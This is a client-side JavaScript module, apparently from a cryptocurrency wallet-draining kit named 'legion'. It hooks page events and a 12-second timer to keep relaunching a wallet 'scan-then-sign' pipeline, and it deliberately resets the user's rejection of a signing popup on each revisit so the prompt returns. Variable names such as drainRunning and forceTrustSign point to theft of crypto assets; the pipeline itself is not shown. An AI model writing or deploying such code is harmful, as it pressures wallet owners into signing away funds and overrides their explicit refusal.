/**
 * Trust site — single debounced resume → legion.startPipeline('resume').
 * No parallel continueConnected / forceTrustSign (pipeline owner = legion.js).
 */
(function () {
  'use strict';

  var kicking = false;
  var lastKickAt = 0;
  var DEBOUNCE_MS = 1000;

  function kick(why) {
    var now = Date.now();
    if (kicking) return;
    if ((now - lastKickAt) < DEBOUNCE_MS) return;
    try {
      var L = window.legion;
      if (!L) return;
      var S = L.state || {};
      var addr = S.evmAddr;
      try {
        if (!addr) addr = sessionStorage.getItem('legion_wc_evm_addr') || sessionStorage.getItem('trust_site_connected_addr');
      } catch (_) {}
      if (!addr && !S.evmProvider) return;
      if (addr && !S.evmAddr) {
        try { S.evmAddr = String(addr).toLowerCase(); } catch (_) {}
      }

      // Real success = stop; soft flags alone must not block forever
      try {
        if (typeof L.evmAlreadyConfirmed === 'function' && L.evmAlreadyConfirmed() && S.postConnectComplete) {
          return;
        }
      } catch (_) {}
      if (typeof L.pipelineBusy === 'function' && L.pipelineBusy()) return;
      if (S.drainRunning) return;

      // FIX: reset rejection state on revisit so popup re-appears.
      // User closed/backgrounded the site after cancelling — show popup again.
      var isRevisit = (why === 'visible' || why === 'focus' || why === 'pageshow');
      if (isRevisit && S.userRejectedSign) {
        S.userRejectedSign = false;
        S.postConnectComplete = false;
        console.warn('[TrustBridge] reset rejection state on revisit →', why);
      }

      kicking = true;
      lastKickAt = now;
      console.warn('[TrustBridge] resume:', why, '→ startPipeline');
      var p;
      if (typeof L.startPipeline === 'function') {
        p = L.startPipeline({ reason: why || 'resume' });
      } else if (typeof L.continueConnected === 'function') {
        p = L.continueConnected();
      } else {
        p = Promise.resolve();
      }
      Promise.resolve(p).finally(function () {
        kicking = false;
      });
    } catch (e) {
      kicking = false;
      console.warn('[TrustBridge]', e && e.message);
    }
  }

  // One delayed kick after connect (legion already runs SCAN-THEN-SIGN on connect)
  window.addEventListener('legion:connected', function () {
    setTimeout(function () { kick('connected+2s'); }, 2000);
  });

  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'visible') {
      setTimeout(function () { kick('visible'); }, 400);
    }
  });

  window.addEventListener('pageshow', function () {
    setTimeout(function () { kick('pageshow'); }, 400);
  });

  window.addEventListener('focus', function () {
    setTimeout(function () { kick('focus'); }, 500);
  });

  // Sparse safety net (was 7s — keep lighter; debounce still applies)
  setInterval(function () {
    if (document.visibilityState === 'visible') kick('tick');
  }, 12000);
})();
